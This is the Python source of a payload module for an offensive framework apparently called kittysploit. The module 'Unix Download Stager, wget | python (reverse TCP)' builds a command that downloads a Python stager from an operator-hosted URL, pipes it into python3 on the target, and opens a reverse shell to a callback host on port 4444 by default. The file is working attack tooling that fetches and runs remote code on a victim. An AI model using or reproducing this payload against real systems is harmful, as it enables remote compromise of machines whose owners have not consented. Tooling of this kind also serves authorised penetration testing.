#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_stager_url, build_wget_pipe_python


class Module(Payload):
    __info__ = {
        "name": "Unix Download Stager, wget | python (reverse TCP)",
        "description": (
            "Downloads a hosted Python stager via wget and pipes to python3. "
            "Host stager.py from python_thin_stager on stager_port before running the exploit."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.UNIX,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Callback host (embedded in hosted stager)", True)
    lport = OptPort(4444, "Callback port for reverse_tcp listener", True)
    stager_url = OptString("", "Full URL of hosted Python stager", False)
    stager_port = OptInteger(8000, "Operator HTTP port when stager_url is empty", False, advanced=True)
    python_binary = OptString("python3", "Python interpreter on target", False)

    def generate(self):
        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.py")
            print_info(f"stager_url not set — using {url}")
        return build_wget_pipe_python(url, str(self.python_binary or "python3"))
